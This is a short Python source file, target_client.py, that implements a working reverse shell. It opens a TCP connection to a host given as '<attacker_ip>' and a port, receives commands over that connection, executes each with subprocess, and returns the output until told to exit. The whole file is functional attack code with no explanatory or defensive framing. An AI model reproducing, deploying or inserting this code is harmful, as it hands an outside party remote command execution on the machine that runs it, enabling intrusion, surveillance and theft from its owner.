# target_client.py
import socket
import subprocess
import sys
import os

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        while True:
            cmd = s.recv(1024).decode()
            if cmd.lower() == 'exit':
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
    except Exception as e:
        print(f"Connection error: {str(e)}")
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <port>")
        sys.exit(1)
    connect(sys.argv[1], int(sys.argv[2]))
